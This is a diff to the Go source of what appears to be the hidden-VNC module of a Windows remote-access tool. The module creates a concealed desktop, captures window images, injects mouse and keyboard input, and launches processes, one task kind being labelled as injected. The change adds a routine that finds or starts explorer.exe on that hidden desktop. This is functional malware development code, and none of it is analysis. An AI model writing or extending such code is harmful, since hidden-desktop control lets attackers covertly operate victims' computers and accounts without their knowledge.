@@ -16,35 +16,36 @@ import (
 )
 
 var (
-	procCreateDesktopW      = user32.NewProc("CreateDesktopW")
-	procOpenDesktopW        = user32.NewProc("OpenDesktopW")
-	procCloseDesktop        = user32.NewProc("CloseDesktop")
-	procSetThreadDesktop    = user32.NewProc("SetThreadDesktop")
-	procGetThreadDesktop    = user32.NewProc("GetThreadDesktop")
-	procSwitchDesktop       = user32.NewProc("SwitchDesktop")
-	procGetCurrentThreadId  = kernel32.NewProc("GetCurrentThreadId")
-	procGetDesktopWindow    = user32.NewProc("GetDesktopWindow")
-	procGetWindowRect       = user32.NewProc("GetWindowRect")
-	procIsWindowVisible     = user32.NewProc("IsWindowVisible")
-	procPrintWindow         = user32.NewProc("PrintWindow")
-	procGetWindow           = user32.NewProc("GetWindow")
-	procGetTopWindow        = user32.NewProc("GetTopWindow")
-	procCreateProcessW      = kernel32.NewProc("CreateProcessW")
-	procSendInputHVNC       = user32.NewProc("SendInput")
-	procGetCursorPosHVNC    = user32.NewProc("GetCursorPos")
-	procWindowFromPoint     = user32.NewProc("WindowFromPoint")
-	procScreenToClient      = user32.NewProc("ScreenToClient")
-	procPostMessageW        = user32.NewProc("PostMessageW")
-	procSendMessageTimeoutW = user32.NewProc("SendMessageTimeoutW")
-	procSetWindowPos        = user32.NewProc("SetWindowPos")
-	procSetForegroundWindow = user32.NewProc("SetForegroundWindow")
-	procSetActiveWindow     = user32.NewProc("SetActiveWindow")
-	procSetFocus            = user32.NewProc("SetFocus")
-	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
-	procGetAncestor         = user32.NewProc("GetAncestor")
-	procMapVirtualKeyW      = user32.NewProc("MapVirtualKeyW")
-	procToUnicode           = user32.NewProc("ToUnicode")
-	procGetWindowPlacement  = user32.NewProc("GetWindowPlacement")
+	procCreateDesktopW           = user32.NewProc("CreateDesktopW")
+	procOpenDesktopW             = user32.NewProc("OpenDesktopW")
+	procCloseDesktop             = user32.NewProc("CloseDesktop")
+	procSetThreadDesktop         = user32.NewProc("SetThreadDesktop")
+	procGetThreadDesktop         = user32.NewProc("GetThreadDesktop")
+	procSwitchDesktop            = user32.NewProc("SwitchDesktop")
+	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
+	procGetDesktopWindow         = user32.NewProc("GetDesktopWindow")
+	procGetWindowRect            = user32.NewProc("GetWindowRect")
+	procIsWindowVisible          = user32.NewProc("IsWindowVisible")
+	procPrintWindow              = user32.NewProc("PrintWindow")
+	procGetWindow                = user32.NewProc("GetWindow")
+	procGetTopWindow             = user32.NewProc("GetTopWindow")
+	procCreateProcessW           = kernel32.NewProc("CreateProcessW")
+	procSendInputHVNC            = user32.NewProc("SendInput")
+	procGetCursorPosHVNC         = user32.NewProc("GetCursorPos")
+	procWindowFromPoint          = user32.NewProc("WindowFromPoint")
+	procScreenToClient           = user32.NewProc("ScreenToClient")
+	procPostMessageW             = user32.NewProc("PostMessageW")
+	procSendMessageTimeoutW      = user32.NewProc("SendMessageTimeoutW")
+	procSetWindowPos             = user32.NewProc("SetWindowPos")
+	procSetForegroundWindow      = user32.NewProc("SetForegroundWindow")
+	procSetActiveWindow          = user32.NewProc("SetActiveWindow")
+	procSetFocus                 = user32.NewProc("SetFocus")
+	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
+	procGetAncestor              = user32.NewProc("GetAncestor")
+	procMapVirtualKeyW           = user32.NewProc("MapVirtualKeyW")
+	procToUnicode                = user32.NewProc("ToUnicode")
+	procGetWindowPlacement       = user32.NewProc("GetWindowPlacement")
+	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
 )
 
 const (
@@ -164,6 +165,7 @@ var (
 	hvncWindowToMove    uintptr
 	hvncMouseButtons    uint32
 	hvncPendingActivate uintptr
+	hvncExplorerStarted bool
 	hvncTaskSeq         atomic.Uint64
 	hvncCurrentTaskID   atomic.Uint64
 	hvncCurrentTaskKind atomic.Int64
@@ -186,6 +188,7 @@ const (
 	hvncTaskKeyDown
 	hvncTaskKeyUp
 	hvncTaskMouseWheel
+	hvncTaskAutoStartExplorer
 )
 
 type hvncTask struct {
@@ -361,6 +364,7 @@ func CleanupHVNCDesktop() {
 		hvncDesktopHandle = 0
 	}
 	hvncInitialized = false
+	hvncExplorerStarted = false
 	if hvncThreadTasks != nil {
 		close(hvncThreadTasks)
 		hvncThreadTasks = nil
@@ -450,6 +454,8 @@ func ensureHVNCThread() error {
 					result.err = hvncKeyOnThread(task.vk, false)
 				case hvncTaskMouseWheel:
 					result.err = hvncMouseWheelOnThread(task.delta)
+				case hvncTaskAutoStartExplorer:
+					result.err = hvncAutoStartExplorerOnThread()
 				default:
 					result.img, result.err = hvncCaptureDisplayOnThread(task.display)
 				}
@@ -497,6 +503,19 @@ func StartHVNCProcess(filePath string) error {
 		kind:     hvncTaskStartProcess,
 		filePath: strings.TrimSpace(filePath),
 	}, 10*time.Second)
+	if err != nil {
+		return err
+	}
+	return result.err
+}
+
+func HVNCAutoStartExplorer() error {
+	if hvncExplorerStarted {
+		return nil
+	}
+	result, err := executeHVNCTask(hvncTask{
+		kind: hvncTaskAutoStartExplorer,
+	}, 15*time.Second)
 	if err != nil {
 		return err
 	}
@@ -606,7 +625,7 @@ func hvncThreadWatchdog() {
 
 func shouldTraceHVNCTask(kind hvncTaskKind) bool {
 	switch kind {
-	case hvncTaskMouseDown, hvncTaskMouseUp, hvncTaskKeyDown, hvncTaskKeyUp, hvncTaskMouseWheel, hvncTaskStartProcess, hvncTaskStartProcessInjected:
+	case hvncTaskMouseDown, hvncTaskMouseUp, hvncTaskKeyDown, hvncTaskKeyUp, hvncTaskMouseWheel, hvncTaskStartProcess, hvncTaskStartProcessInjected, hvncTaskAutoStartExplorer:
 		return true
 	default:
 		return false
@@ -633,6 +652,8 @@ func hvncTaskKindName(kind hvncTaskKind) string {
 		return "key_up"
 	case hvncTaskMouseWheel:
 		return "mouse_wheel"
+	case hvncTaskAutoStartExplorer:
+		return "auto_start_explorer"
 	default:
 		return fmt.Sprintf("unknown(%d)", kind)
 	}
@@ -789,6 +810,60 @@ func startHVNCProcessOnThread(filePath string) error {
 		return fmt.Errorf("CreateProcess failed")
 	}
 	return nil
+}
+
+func hvncAutoStartExplorerOnThread() error {
+	if hvncExplorerStarted {
+		return nil
+	}
+
+	found := false
+	hwnd := getTopWindow(0)
+	for hwnd != 0 {
+		var pid uint32
+		procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
+		if pid != 0 && isExplorerPID(pid) {
+			found = true
+			break
+		}
+		hwnd = getWindow(hwnd, GW_HWNDNEXT)
+	}
+
+	if found {
+		log.Printf("hvnc: explorer.exe already running on HVNC desktop, skipping auto-start")
+		hvncExplorerStarted = true
+		return nil
+	}
+
+	log.Printf("hvnc: no explorer.exe found on HVNC desktop, starting explorer.exe")
+	err := startHVNCProcessOnThread("explorer.exe")
+	if err != nil {
+		return fmt.Errorf("auto-start explorer failed: %w", err)
+	}
+	hvncExplorerStarted = true
+	return nil
+}
+
+func isExplorerPID(pid uint32) bool {
+	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+	hProc, _, _ := kernel32.NewProc("OpenProcess").Call(
+		PROCESS_QUERY_LIMITED_INFORMATION, 0, uintptr(pid),
+	)
+	if hProc == 0 {
+		return false
+	}
+	defer procCloseHandle.Call(hProc)
+
+	var buf [260]uint16
+	size := uint32(len(buf))
+	ret, _, _ := kernel32.NewProc("QueryFullProcessImageNameW").Call(
+		hProc, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)),
+	)
+	if ret == 0 {
+		return false
+	}
+	name := strings.ToLower(syscall.UTF16ToString(buf[:size]))
+	return strings.HasSuffix(name, `\explorer.exe`)
 }
 
 func hvncMouseMoveOnThread(display int, x, y int32) error {
